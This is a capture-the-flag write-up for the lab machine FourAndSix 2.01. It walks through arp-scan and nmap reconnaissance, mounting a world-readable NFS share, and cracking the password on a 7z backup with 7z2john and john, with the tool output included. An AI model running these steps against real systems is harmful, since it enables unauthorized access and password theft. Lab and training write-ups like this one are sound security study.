# FourAndSix: 2.01

## 1.Get VM IP
```bash
root@kali: arp-scan -I eth0 -l

Interface: eth0, type: EN10MB, MAC: 08:00:27:b2:e9:3f, IPv4: 192.168.56.102
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:0f       (Unknown: locally administered)
192.168.56.100  08:00:27:95:6e:f7       PCS Systemtechnik GmbH
192.168.56.110  08:00:27:41:81:5a       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.603 seconds (98.35 hosts/sec). 3 responded
```
The IP address is `192.168.56.110`, let's enumerate it.


## 2.Enumeration
I first used rust scan which is alot faster than nmap to scan for top ports :
```bash
root@kali: rustscan -a 192.168.56.110 --range --top

Host is up, received arp-response (0.00054s latency).
Scanned at 2023-11-05 06:20:41 EST for 0s

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
111/tcp  open  rpcbind syn-ack ttl 64
973/tcp  open  unknown syn-ack ttl 64
2049/tcp open  nfs     syn-ack ttl 64
MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)
```

then scanned the open ports with nmap :

```bash
root@kali: nmap -sC -sV -p22,111,973,2049 -v -oN nmap.out 192.168.56.110

Nmap scan report for 192.168.56.110
Host is up (0.00036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 ef:3b:2e:cf:40:19:9e:bb:23:1e:aa:24:a1:09:4e:d1 (RSA)
|   256 c8:5c:8b:0b:e1:64:0c:75:c3:63:d7:b3:80:c9:2f:d2 (ECDSA)
|_  256 61:bc:45:9a:ba:a5:47:20:60:13:25:19:b0:47:cb:ad (ED25519)
111/tcp  open  rpcbind 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3         2049/tcp   nfs
|   100003  2,3         2049/udp   nfs
|   100005  1,3          763/udp   mountd
|_  100005  1,3          973/tcp   mountd
973/tcp  open  mountd  1-3 (RPC #100005)
2049/tcp open  nfs     2-3 (RPC #100003)
MAC Address: 08:00:27:41:81:5A (Oracle VirtualBox virtual NIC)
```

let's go for nfs first,

```bash
root@kali: showmount -e 192.168.56.110
       
Export list for 192.168.56.110:
/home/user/storage (everyone)
```

now mount it on your system :

```bash
root@kali: mount 192.168.56.110:/home/user/storage /mnt/tmp

root@kali: ls /mnt/tmp
backup.7z
```

when you want to unzip the file it asks for password and the only way to find it is to brute force the password

use the tool `7z2john` for this :

```bash
root@kali: 7z2john backup.7z > ziphash.txt

root@kali : john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 0 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 9488 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (backup.7z)     
1g 0:00:00:01 DONE (2023-11-05 06:31) 0.9708g/s 31.06p/s 31.06c/s 31.06C/s 654321..butterfly
Use the "--show" option to display all of the cracked passwords reliably
```
















